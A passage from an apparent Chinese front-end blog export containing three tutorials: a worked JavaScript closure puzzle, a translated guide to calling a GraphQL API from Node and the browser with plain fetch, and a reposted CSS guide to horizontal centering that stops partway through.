<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function fun(n,o) &#123;</span><br><span class="line">  console.log(o)</span><br><span class="line">  return &#123;</span><br><span class="line">    fun:function(m)&#123;</span><br><span class="line">      return fun(m,n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">var a &#x3D; fun(0);  a.fun(1);  a.fun(2);  a.fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">var b &#x3D; fun(0).fun(1).fun(2).fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">var c &#x3D; fun(0).fun(1);  c.fun(2);  c.fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br><span class="line">&#x2F;&#x2F;问:三行a,b,c的输出分别是什么？</span><br></pre></td></tr></table></figure>

<p><strong>1、第一行a</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a &#x3D; fun(0);  a.fun(1);  a.fun(2);  a.fun(3);</span><br></pre></td></tr></table></figure>

<p>可以得知，第一个fun(0)是在调用第一层fun函数。第二个fun(1)是在调用前一个fun的返回值的fun函数，所以：</p>
<p>第后面几个fun(1),fun(2),fun(3),函数都是在调用第二层fun函数。</p>
<p>遂：</p>
<p>在第一次调用fun(0)时，o为undefined；</p>
<p>第二次调用fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p>
<p>第三次调用fun(2)时m为2，但依然是调用a.fun，所以还是闭包了第一次调用时的n，所以内部调用第一层的fun(2,0);所以o为0</p>
<p>第四次同理；</p>
<p><strong>即：最终答案为undefined,0,0,0</strong></p>
<p><strong>2、第二行b</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var b &#x3D; fun(0).fun(1).fun(2).fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br></pre></td></tr></table></figure>

<p>先从fun(0)开始看，肯定是调用的第一层fun函数；而他的返回值是一个对象，所以第二个fun(1)调用的是第二层fun函数，后面几个也是调用的第二层fun函数。</p>
<p>遂：</p>
<p>在第一次调用第一层fun(0)时，o为undefined；</p>
<p>第二次调用 .fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p>
<p>第三次调用 .fun(2)时m为2，此时当前的fun函数不是第一次执行的返回对象，而是第二次执行的返回对象。而在第二次执行第一层fun函数时时(1,0)所以n=1,o=0,返回时闭包了第二次的n，遂在第三次调用第三层fun函数时m=2,n=1，即调用第一层fun函数fun(2,1)，所以o为1；</p>
<p>第四次调用 .fun(3)时m为3，闭包了第三次调用的n，同理，最终调用第一层fun函数为fun(3,2)；所以o为2；</p>
<p><strong>即最终答案：undefined,0,1,2</strong></p>
<p><strong>3、第三行c</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var c &#x3D; fun(0).fun(1);  c.fun(2);  c.fun(3);&#x2F;&#x2F;undefined,?,?,?</span><br></pre></td></tr></table></figure>

<p>根据前面两个例子，可以得知：</p>
<p>fun(0)为执行第一层fun函数，.fun(1)执行的是fun(0)返回的第二层fun函数，这里语句结束，遂c存放的是fun(1)的返回值，而不是fun(0)的返回值，所以c中闭包的也是fun(1)第二次执行的n的值。c.fun(2)执行的是fun(1)返回的第二层fun函数，c.fun(3)执行的也是fun(1)返回的第二层fun函数。</p>
<p>遂：</p>
<p>在第一次调用第一层fun(0)时，o为undefined；</p>
<p>第二次调用 .fun(1)时m为1，此时fun闭包了外层函数的n，也就是第一次调用的n=0，即m=1，n=0，并在内部调用第一层fun函数fun(1,0);所以o为0；</p>
<p>第三次调用 .fun(2)时m为2，此时fun闭包的是第二次调用的n=1，即m=2，n=1，并在内部调用第一层fun函数fun(2,1);所以o为1；</p>
<p>第四次.fun(3)时同理，但依然是调用的第二次的返回值，遂最终调用第一层fun函数fun(3,1)，所以o还为1</p>
<p><strong>即最终答案：undefined,0,1,1</strong></p>
<p><strong>后话</strong></p>
<p>这段代码原本是在做一个将异步回调改写为同步调用的组件时的代码，发现了这个坑，对JS的闭包有了更深入的了解。</p>
<p>关于什么是闭包，网上的文章数不胜数，但理解什么是闭包还是要在代码中自己去发现与领悟。</p>
<p>如果要我说什么是闭包，我认为，广义上的闭包就是指一个变量在他自身作用域外被使用了，就叫发生了闭包。</p>
<p>希望读者能通过本文对闭包现象有进一步的了解，如有其它见解或看法，欢迎指正或留言讨论。</p>
<blockquote>
<p>作者：小小沧海<br>出处：<a href="http://www.cnblogs.com/xxcanghai/">http://www.cnblogs.com/xxcanghai/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>如何在纯 JavaScript 中使用GraphQL</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%A6%82%E4%BD%95%E5%9C%A8%E7%BA%AF-JavaScript-%E4%B8%AD%E4%BD%BF%E7%94%A8-GraphQL/</url>
    <content><![CDATA[<p>作者 | Brian Rinaldi译者 | 王强策划 | 李俊辰</p>
<p>除了 REST 以外，很多 API 都开始支持 GraphQL，甚至完全支持它了。但是，如果你需要使用一个 GraphQL API，你很自然就会想到自己需要使用 React 和 / 或其他一些库才能让它跑起来。这是因为许多教程和示例代码似乎都基于这样一个假设，也就是说如果你在使用 GraphQL，就需要使用这些库。</p>
<p>但是，一个对 GraphQL API 的查询只不过是一个定制格式的 HTTP 请求而已。一个 GraphQL 响应也不过是 JSON 罢了。你不需要动用什么精美的库也可以处理它们。在这篇教程中，我想采用一种不一样的方法，并向你展示从 Node 和客户端 JavaScript（不带库）调用 GraphQL API 实际上有多么容易。</p>
<p>GraphQL 请求的基础知识</p>
<p>与 RESTful API 不同，GraphQL 具有单个端点。尽管 GraphQL 可以响应 GET 请求，但是一个典型的 GraphQL HTTP 请求是作为一个 POST 请求发送的。</p>
<p>你的 GraphQL 请求可以发送三段数据：query、operationName 和 variables。</p>
<p>query 是必需的，并且包含了（你猜对了）GraphQL 查询。由于 GraphQL 是通过单个端点运行的，因此端点响应的数据完全取决于你的查询。这个查询需要正确格式化 GraphQL。想知道如何构建查询吗？请查阅关于如何编写 GraphQL 查询的教程。</p>
<p><a href="https://stepzen.com/blog/how-to-write-graphql-queries">https://stepzen.com/blog/how-to-write-graphql-queries</a></p>
<p>variables 是可选的，并且是一个 JSON 对象，其中包含要传递给查询的所有变量的值。例如，如果你的查询需要一个变量 id（将在查询中显示为 $id），则需要按以下方式发送变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>operationName 也是可选的。当查询包含多个命名操作的查询时，它用于指定要运行的操作。</p>
<p>如果你将一个 GraphQL 作为一个 GET 请求发送，则需要将以上内容作为查询参数传递。鉴于 GraphQL 查询可能会变得很长，这实际上不是最佳选择，因此我们还是考虑 POST 请求。在本教程中，我们将介绍我在 StepZen 上创建的一个简单的 Scooby DooAPI，它用来连接到一个 MySQL 数据源（StepZen 现在处于私有 alpha 状态，但是你可以在此处请求访问：</p>
<p><a href="https://stepzen.com/request-invite">https://stepzen.com/request-invite</a></p>
<p>在 Node.js 中发送查询我们可以通过不带任何特殊库的 Node.js 发送查询，利用标准的 Node https 库格式化一个 POST 请求。我们来看一个不使用特殊库的简单示例（请注意，我确实使用了 dotenv 来获取用于访问我 StepZen 后端的 API 密钥）。在这个示例中，我仅传递了一个 query，该查询在发送前需要字符串化。除此之外，这是一个相当标准的 HTTPPOST。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const https &#x3D; require(&#39;https&#39;);</span><br><span class="line">require(&#39;dotenv&#39;).config();</span><br><span class="line">const data &#x3D; JSON.stringify(&#123;</span><br><span class="line">  query: &#96;&#123;</span><br><span class="line">    characters(isMonster:true) &#123;</span><br><span class="line">      name</span><br><span class="line">      episode &#123;</span><br><span class="line">        name</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#96;,</span><br><span class="line">&#125;);</span><br><span class="line">const options &#x3D; &#123;</span><br><span class="line">  hostname: &#39;biggs.stepzen.net&#39;,</span><br><span class="line">  path: &#39;&#x2F;scoobydoo&#x2F;scoobydoo&#x2F;__graphql&#39;,</span><br><span class="line">  port: 443,</span><br><span class="line">  method: &#39;POST&#39;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">    &#39;Content-Length&#39;: data.length,</span><br><span class="line">    Authorization: &#39;Apikey &#39; + process.env.STEPZEN_API_KEY,</span><br><span class="line">    &#39;User-Agent&#39;: &#39;Node&#39;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line">const req &#x3D; https.request(options, (res) &#x3D;&gt; &#123;</span><br><span class="line">  let data &#x3D; &#39;&#39;;</span><br><span class="line">  console.log(&#96;statusCode: $&#123;res.statusCode&#125;&#96;);</span><br><span class="line">  res.on(&#39;data&#39;, (d) &#x3D;&gt; &#123;</span><br><span class="line">    data +&#x3D; d;</span><br><span class="line">  &#125;);</span><br><span class="line">  res.on(&#39;end&#39;, () &#x3D;&gt; &#123;</span><br><span class="line">    console.log(JSON.parse(data).data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">req.on(&#39;error&#39;, (error) &#x3D;&gt; &#123;</span><br><span class="line">  console.error(error);</span><br><span class="line">&#125;);</span><br><span class="line">req.write(data);</span><br><span class="line">req.end();</span><br></pre></td></tr></table></figure>

<p>同样，返回的数据只是 JSON 而已，因此如果我们要运行它，则控制台中的输出将是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  characters: [</span><br><span class="line">    &#123; episode: [Object], name: &#39;Black Knight&#39; &#125;,</span><br><span class="line">    &#123; episode: [Object], name: &#39;Ghost of Captain Cutler&#39; &#125;,</span><br><span class="line">    &#123; episode: [Object], name: &#39;Phantom&#39; &#125;,</span><br><span class="line">    &#123; episode: [Object], name: &#39;Miner Forty-Niner&#39; &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简化请求<br>我们来使用 node-fetch 之类的东西来简化这一过程，以减少发出 HTTP 请求所需的样板代码量。node-fetch 库从 Node 中的浏览器实现 JavaScript fetch API。这样我们就可以丢弃大约 11 行代码（减少了 25％），同时还让代码更容易阅读了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const fetch &#x3D; require(&#39;node-fetch&#39;);</span><br><span class="line">require(&#39;dotenv&#39;).config();</span><br><span class="line">async function getData() &#123;</span><br><span class="line">  const data &#x3D; JSON.stringify(&#123;</span><br><span class="line">    query: &#96;&#123;</span><br><span class="line">        characters(isMonster:true) &#123;</span><br><span class="line">          name</span><br><span class="line">          episode &#123;</span><br><span class="line">            name</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;&#96;,</span><br><span class="line">  &#125;);</span><br><span class="line">  const response &#x3D; await fetch(</span><br><span class="line">    &#39;https:&#x2F;&#x2F;biggs.stepzen.net&#x2F;scoobydoo&#x2F;scoobydoo&#x2F;__graphql&#39;,</span><br><span class="line">    &#123;</span><br><span class="line">      method: &#39;post&#39;,</span><br><span class="line">      body: data,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">        &#39;Content-Length&#39;: data.length,</span><br><span class="line">        Authorization: &#39;Apikey &#39; + process.env.STEPZEN_API_KEY,</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Node&#39;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">  const json &#x3D; await response.json();</span><br><span class="line">  console.log(json.data);</span><br><span class="line">&#125;</span><br><span class="line">getData();</span><br></pre></td></tr></table></figure>

<p>运行上面代码的结果与我们之前的示例相同。</p>
<p>传递变量在此示例中，我们的查询具有一个需要传递的变量（$id）。为了传递这个变量，我们需要将变量值添加到请求正文中包含的数据里。这应该是一个 JSON 格式的列表，其中查询所需的每个变量在 JSON 中都有一个对应的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const fetch &#x3D; require(&#39;node-fetch&#39;);</span><br><span class="line">require(&#39;dotenv&#39;).config();</span><br><span class="line">async function getData(id) &#123;</span><br><span class="line">  const data &#x3D; JSON.stringify(&#123;</span><br><span class="line">    query: &#96;query ScoobyDooWhereAreYou($id: ID!) &#123;</span><br><span class="line">        character(id:$id) &#123;</span><br><span class="line">          name</span><br><span class="line">          isMonster</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;&#96;,</span><br><span class="line">    variables: &#96;&#123;</span><br><span class="line">        &quot;id&quot;: &quot;$&#123;id&#125;&quot;</span><br><span class="line">      &#125;&#96;,</span><br><span class="line">  &#125;);</span><br><span class="line">  const response &#x3D; await fetch(</span><br><span class="line">    &#39;https:&#x2F;&#x2F;biggs.stepzen.net&#x2F;scoobydoo&#x2F;scoobydoo&#x2F;__graphql&#39;,</span><br><span class="line">    &#123;</span><br><span class="line">      method: &#39;post&#39;,</span><br><span class="line">      body: data,</span><br><span class="line">      headers: &#123;</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">        &#39;Content-Length&#39;: data.length,</span><br><span class="line">        Authorization: &#39;Apikey &#39; + process.env.STEPZEN_API_KEY,</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Node&#39;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">  const json &#x3D; await response.json();</span><br><span class="line">  console.log(json.data);</span><br><span class="line">&#125;</span><br><span class="line">getData(1);</span><br></pre></td></tr></table></figure>

<p>在本例中，我传递的 ID 值为 1，它返回的是 Scooby Doo，这不是什么巧合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; character: &#123; isMonster: false, name: &#39;Scooby Doo&#39; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们知道 Scooby Doo 在哪里了。</p>
<p>使用客户端 JavaScript 发送查询</p>
<p>通过客户端 JavaScript 调用 GraphQL 查询的操作与上面的 fetch 示例几乎是一样的，只有一些很小的区别。首先，我显然不需要导入一个库来支持 fetch。其次，更重要的是我无法访问环境变量。需要强调的是，如果你的 API 需要传递某种 API 密钥或凭据，那么你不会希望在客户端执行这一操作，因为你的凭据将被公开。更好的解决方案是调用一个可访问这些凭据的无服务器函数，然后为你调用 API 并返回结果。如果你的无服务器函数是用 JavaScript 编写的，则前面示例中的 Node 代码就会起作用。不过在 API 完全开放的情况下，我们先来看一下它是如何完成的（请注意，我的示例确实有一个 API 密钥，但请按照我说的那样做，不要像在演示中那样对付一下……）。</p>
<p>以下示例调用了我的 Scooby API 来获取一个 monster 列表和它们所出现的剧集列表（抱歉，Scooby 粉丝们，我现在只统计了第 1 季中的少数 monster）。然后它会获取结果并将其显示在浏览器中。尽管这对 GraphQL 调用来说并不重要，但我使用 js-beautify 正确格式化了要显示的 JSON 结果，然后使用 Prism 给它上了色。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;GraphQL Query Example&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;css&#x2F;prism.css&quot; rel&#x3D;&quot;stylesheet&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;pre&gt;&lt;code class&#x3D;&quot;language-json&quot; id&#x3D;&quot;code&quot;&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;prism.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;js-beautify&#x2F;1.13.0&#x2F;beautify.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      (async function () &#123;</span><br><span class="line">        const data &#x3D; JSON.stringify(&#123;</span><br><span class="line">          query: &#96;&#123;</span><br><span class="line">    characters(isMonster:true) &#123;</span><br><span class="line">      name</span><br><span class="line">      episode &#123;</span><br><span class="line">        name</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#96;,</span><br><span class="line">        &#125;);</span><br><span class="line">        const response &#x3D; await fetch(</span><br><span class="line">          &#39;https:&#x2F;&#x2F;biggs.stepzen.net&#x2F;scoobydoo&#x2F;scoobydoo&#x2F;__graphql&#39;,</span><br><span class="line">          &#123;</span><br><span class="line">            method: &#39;post&#39;,</span><br><span class="line">            body: data,</span><br><span class="line">            headers: &#123;</span><br><span class="line">              &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">              &#39;Content-Length&#39;: data.length,</span><br><span class="line">              Authorization:</span><br><span class="line">                &#39;Apikey DONOTSENDAPIKEYS&#39;,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">        const json &#x3D; await response.json();</span><br><span class="line">        document.getElementById(&#39;code&#39;).innerHTML &#x3D; js_beautify(</span><br><span class="line">          JSON.stringify(json.data)</span><br><span class="line">        );</span><br><span class="line">        Prism.highlightAll();</span><br><span class="line">      &#125;)();</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>运行以上代码的结果是 JSON 响应，其中包含浏览器中显示的角色和剧集数据。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-df2d216399539c3c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>显然，一般来说你不会想要简单地向用户显示查询结果，因此让我们看一下如何使用返回的数据。</p>
<p>使用 GraphQL 查询响应</p>
<p>GraphQL 的一大优点是，它的响应只是纯 JSON，因此数据使用起来很容易。这里更好的是响应对应了查询，这意味着你无需花费大量时间来分析关于响应的文档。因此我们可以快速采用上面的示例并利用返回的数据，而不是简单地把它摆出来。</p>
<p>下面的代码会获取 JSON 响应，然后将其转换为 HTML（使用模板字面量），以将各项附加到一个 HTML 列表上。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;ul id&#x3D;&quot;monsterList&quot;&gt;&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  (async function () &#123;</span><br><span class="line">    const data &#x3D; JSON.stringify(&#123;</span><br><span class="line">      query: &#96;&#123;</span><br><span class="line">    characters(isMonster:true) &#123;</span><br><span class="line">      name</span><br><span class="line">      episode &#123;</span><br><span class="line">        name</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#96;,</span><br><span class="line">    &#125;);</span><br><span class="line">    const response &#x3D; await fetch(</span><br><span class="line">      &#39;https:&#x2F;&#x2F;biggs.stepzen.net&#x2F;scoobydoo&#x2F;scoobydoo&#x2F;__graphql&#39;,</span><br><span class="line">      &#123;</span><br><span class="line">        method: &#39;post&#39;,</span><br><span class="line">        body: data,</span><br><span class="line">        headers: &#123;</span><br><span class="line">          &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;,</span><br><span class="line">          &#39;Content-Length&#39;: data.length,</span><br><span class="line">          Authorization:</span><br><span class="line">            &#39;Apikey DONOTSENDAPIKEYS&#39;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">    const characterData &#x3D; await response.json();</span><br><span class="line">    const templateFn &#x3D; (name, episode) &#x3D;&gt; &#96;&lt;li&gt;$&#123;name&#125; ($&#123;episode&#125;)&lt;&#x2F;li&gt;&#96;;</span><br><span class="line">    const monsterList &#x3D; document.getElementById(&#39;monsterList&#39;);</span><br><span class="line">    characterData.data.characters.map((character) &#x3D;&gt; &#123;</span><br><span class="line">      monsterList.insertAdjacentHTML(</span><br><span class="line">        &#39;beforeend&#39;,</span><br><span class="line">        templateFn(character.name, character.episode.name)</span><br><span class="line">      );</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>运行这个简单示例的输出是一个角色及其出现剧集的无序列表。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-79bde22afcf3e136?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p>接下来可以做什么</p>
<p>这里的目标不是让大家不要使用 GraphQL 客户端库来执行 GraphQL 查询。那些库提供的能力远远超过了我在这里讨论的简单功能。此外，许多工具具备很容易和前端框架（例如 React、Vue、Angular）集成的能力。但是，对于研究 GraphQL 的人们来说（尤其是将其与 REST 对比时），很重要的一点是使用 GraphQL 显然不需要任何外部依赖项。如果你有兴趣探索一些 JavaScript 库，请参考下面的这些流行选项：</p>
<ul>
<li><p>  Apollo Client</p>
</li>
<li><p>  <a href="https://github.com/apollographql/apollo-client">https://github.com/apollographql/apollo-client</a></p>
</li>
<li><p>  urql</p>
</li>
<li><p>  <a href="https://formidable.com/open-source/urql/">https://formidable.com/open-source/urql/</a></p>
</li>
<li><p>  Relay</p>
</li>
<li><p>  <a href="https://relay.dev/">https://relay.dev/</a></p>
</li>
<li><p>  GraphQL Request</p>
</li>
<li><p>  <a href="https://github.com/prisma-labs/graphql-request">https://github.com/prisma-labs/graphql-request</a></p>
</li>
</ul>
<p> 作者介绍</p>
<p>Brian Rinaldi 是 StepZen 的一位开发倡导者。Brian 在 Progress Software 和 Adobe 等公司已有 10 多年的经验，一直致力于开发者社区和开发者关系工作。Brian 加入软件开发行业已超过 20 年，主要研究 Web 前端和后端技术。</p>
<p> 延伸阅读</p>
<p><a href="https://stepzen.com/blog/consume-graphql-in-javascript">https://stepzen.com/blog/consume-graphql-in-javascript</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>如何居中一个元素（终结版）</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%A6%82%E4%BD%95%E5%B1%85%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0%EF%BC%88%E7%BB%88%E7%BB%93%E7%89%88%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载，<a href="https://github.com/ljianshu/Blog/issues/29">原文链接</a><br>本文主要介绍水平居中，垂直居中，还有水平垂直居中各种办法，思维导图如下：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c7c36e3854116049?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" title="image"></p>
<h2 id="一、水平居中"><a href="#一、水平居中" class="headerlink" title="一、水平居中"></a>一、水平居中</h2><h3 id="1-行内元素水平居中"><a href="#1-行内元素水平居中" class="headerlink" title="1.行内元素水平居中"></a>1.行内元素水平居中</h3><p><strong>利用 text-align: center 可以实现在块级元素内部的行内元素水平居中</strong>。此方法对inline、inline-block、inline-table和inline-flex元素水平居中都有效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .parent&#123;&#x2F;&#x2F;在父容器设置</span><br><span class="line">        text-align:center;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此外，如果块级元素内部包着也是一个块级元素，<strong>我们可以先将其由块级元素改变为行内块元素，再通过设置行内块元素居中以达到水平居中</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">  .parent&#123; </span><br><span class="line">    text-align:center;   </span><br><span class="line">  &#125; </span><br><span class="line">  .child &#123; </span><br><span class="line">    display: inline-block;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-块级元素的水平居中"><a href="#2-块级元素的水平居中" class="headerlink" title="2.块级元素的水平居中"></a>2.块级元素的水平居中</h3><p>这种情形可以有多种实现方式，下面我们详细介绍:</p>
<h4 id="①margin-0-auto"><a href="#①margin-0-auto" class="headerlink" title="①margin:0 auto"></a>①margin:0 auto</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.child&#123;</span><br><span class="line">    width: 100px;&#x2F;&#x2F;确保该块级元素定宽</span><br><span class="line">    margin:0 auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②使用table-margin"><a href="#②使用table-margin" class="headerlink" title="②使用table+margin"></a>②使用table+margin</h4><p><strong>先将子元素设置为块级表格来显示（类似），再将其设置水平居中</strong></p>
<p><strong>display:table在表现上类似block元素，但是宽度为内容宽。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .child &#123;</span><br><span class="line">   display: table;</span><br><span class="line">    margin: 0 auto;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h4 id="③使用absolute-transform"><a href="#③使用absolute-transform" class="headerlink" title="③使用absolute+transform"></a>③使用absolute+transform</h4><p><strong>先将父元素设置为相对定位，再将子元素设置为绝对定位，向右移动子元素，移动距离为父容器的一半，最后通过向左移动子元素的一半宽度以达到水平居中。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">  .child &#123; </span><br><span class="line">    position:absolute; </span><br><span class="line">    left:50%; </span><br><span class="line">    transform:translateX(-50%); </span><br><span class="line">  &#125;</span><br><span class="line">  .parent &#123;</span><br><span class="line">    position:relative;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p><strong>不过transform属于css3内容，兼容性存在一定问题，高版本浏览器需要添加一些前缀</strong>。</p>
<h4 id="④使用flex-justify-content"><a href="#④使用flex-justify-content" class="headerlink" title="④使用flex+justify-content"></a>④使用flex+justify-content</h4><p><strong>通过CSS3中的布局利器flex中的justify-content属性来达到水平居中。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .parent &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content:center;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h4 id="⑤使用flex-margin"><a href="#⑤使用flex-margin" class="headerlink" title="⑤使用flex+margin"></a>⑤使用flex+margin</h4><p><strong>通过flex将父容器设置为为Flex布局，再设置子元素居中。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;div class&#x3D;&quot;parent&quot;&gt; </span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;Demo&lt;&#x2F;div&gt; </span><br><span class="line">&lt;&#x2F;div&gt; </span><br><span class="line">&lt;style&gt; </span><br><span class="line">  .parent &#123; </span><br><span class="line">    display: flex; </span><br><span class="line">  &#125; </span><br><span class="line">  .child &#123; </span><br><span class="line">    margin:0 auto;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-多块级元素水平居中"><a href="#3-多块级元素水平居中" class="headerlink" title="3.多块级元素水平居中"></a>3.多块级元素水平居中</h3><p><img src="https://upload-images.jianshu.io/upload_images/10024246-7eef3b139cb04b0b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h4 id="①利用flex布局"><a href="#①利用flex布局" class="headerlink" title="①利用flex布局"></a>①利用flex布局</h4><p><strong>利用弹性布局(flex)，实现水平居中，其中justify-content 用于设置弹性盒子元素在主轴（默认横轴）方向上的对齐方式</strong>，本例中设置子元素水平居中显示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #container &#123;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>源代码演示</strong></p>
<h4 id="②利用inline-block"><a href="#②利用inline-block" class="headerlink" title="②利用inline-block"></a>②利用inline-block</h4><p><strong>将要水平排列的块状元素设为display:inline-block，然后在父级元素上设置text-align:center，达到与上面的行内元素的水平居中一样的效果</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.container &#123;2text-align: center;3&#125;4.inline-block &#123;5display: inline-block;6&#125;</span><br></pre></td></tr></table></figure>

<p><strong>源代码演示</strong></p>
